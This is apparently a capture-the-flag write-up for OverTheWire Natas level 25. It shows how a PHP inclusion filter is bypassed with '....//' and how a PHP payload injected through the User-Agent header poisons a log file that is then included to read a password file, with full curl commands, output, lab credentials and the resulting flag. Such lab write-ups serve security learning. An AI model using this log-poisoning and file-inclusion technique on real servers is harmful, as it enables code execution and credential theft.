# Level 25

## What does the main page look like?

```php
$ curl -s --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "GHF6X7YwACaYYssHVY05cFq83hRktl4c" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

<h2>Quote</h2><p align="justify">You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.<div align="right"><h6>Scientist, Bad Boy Bubby</h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Source code

```php
$ curl -s --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</
script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id
() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Identification of vulnerabilities

### Log file

There is a logging function named `logRequest()` that will save the history some of our access attempts in a log file named `natas25_`, suffixed by the `session_id`, and located in `/var/www/natas/natas25/logs/`. It makes use of a custom format involving several fields, one of which being the user-agent. This latest is not sanitized and we may be able to inject PHP code in a fake user-agent to execute it by the server and write content to the log file:

```php
function logRequest($message){
	$log="[". date("d.m.Y H::i:s",time()) ."]";
	$log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
	$log=$log . " \"" . $message ."\"\n"; 
	$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id
	() .".log","a");
	fwrite($fd,$log);
	fclose($fd);
}
```

### Language files are PHP files

Another interesting thing is that language files are actually PHP files (`en`, `de`) stored in the `/language` relative directory. Three variables are defined in these files (`$__GRETTING`, `$__MSG` and `$__FOOTER`). The PHP file is included by the `safeinclude()` function, if they pass the filtering tests.

```php
$ curl -s --user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c http://natas25.natas.labs.overthewire.org/language/en
<?php
global $__GREETING;
global $__MSG;
global $__FOOTER;

$__GREETING="Quote";

$__MSG="You see, no one's going to help you Bubby, because there isn't anybody out there to do it. No one. We're all just complicated arrangements of atoms and subatomic particles - we don't live. But our atoms do move about in such a way as to give us identity and consciousness. We don't die; our atoms just rearrange themselves. There is no God. There can be no God; it's ridiculous to think in terms of a superior being. An inferior being, maybe, because we, we who don't even exist, we arrange our lives with more order and harmony than God ever arranged the earth. We measure; we plot; we create wonderful new things. We are the architects of our own existence. What a lunatic concept to bow down before a God who slaughters millions of innocent children, slowly and agonizingly starves them to death, beats them, tortures them, rejects them. What folly to even think that we should not insult such a God, damn him, think him out of existence. It is our duty to think God out of existence. It is our duty to insult him. Fuck you, God! Strike me down if you dare, you tyrant, you non-existent fraud! It is the duty of all human beings to think God out of existence. Then we have a future. Because then - and only then - do we take full responsibility for who we are. And that's what you must do, Bubby: think God out of existence; take responsibility for who you are.";

$__FOOTER="Scientist, Bad Boy Bubby";
?>
```
*Note: this is very surprising to see PHP code displayed this way, as this should not be the case by default. This has very likely been done on purpose to make this challenge solvable.*

### Inclusion filtering tests

According to the source code, there are only 2 tests to filter the `lang` parameter sent to the `GET` request that will include the language file:

* it should not contain `../`, as this will be interpreted as directory traversal attempts and `../` will be removed by the `str_replace()` function. As a result `....//....//....//` will be `../../../`.
* it should not contain `natas_webpass`.

```php
function safeinclude($filename){
	// check for directory traversal
	if(strstr($filename,"../")){
		logRequest("Directory traversal attempt! fixing request.");
		$filename=str_replace("../","",$filename);
	}
	
	// dont let ppl steal our passwords
	if(strstr($filename,"natas_webpass")){
		logRequest("Illegal file access detected! Aborting!");
		exit(-1);
	}
	
	// add more checks...
	
	if (file_exists($filename)) { 
		include($filename);
		return 1;
	}
	
	return 0;
}
```

## Solution

### Steps

With all these vulnerabilities identified, our objective will be:
* to create a fake user-agent that will inject PHP code to read the password file
* to trigger a fake alert (e.g. via `?lang=../`) with our fake user-agent to make sure a line of log is written
* to include the log file via an injection of the `lang` parameter

### Exploit

Let's first trigger the alert in the log file with our fake user agent, add gather the session cookie. Our user-agent string contains PHP code that will instruct PHP to read the password file.

~~~
$ curl -s \
	--user-agent "<?php readfile('/etc/natas_webpass/natas26'); ?>" \
	--user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
	--cookie-jar sessid.txt \
	http://natas25.natas.labs.overthewire.org/?lang=../
~~~

The command above has generated a text file where our PHPSESSID cookie is stored. We can use a regular expression to extract the PHPSESSID value:

~~~
$ cat sessid.txt 
# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_natas25.natas.labs.overthewire.org	FALSE	/	FALSE	0	PHPSESSID	3o2ruekvm5j7i0o0mttnp26145

$ grep -Po "[a-zA-Z0-9]{26}" sessid.txt
3o2ruekvm5j7i0o0mttnp26145
unknown@unknown:/data/documents/challenges/overthewire/Natas/level25$ 
~~~

Now, let's access the log file. Notice that we use `....//` to access the parent level (as the file is read in the `language/` directory by default). This string will be escaped and transformed to `../` thanks to `str_replace('../', '')`.

~~~
$ curl -s \
	--user natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c \
	http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_$(grep -Po "[a-zA-Z0-9]{26}" sessid.txt).log
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "GHF6X7YwACaYYssHVY05cFq83hRktl4c" };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[23.04.2020 05::17:55] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~

# Flag
~~~
natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
~~~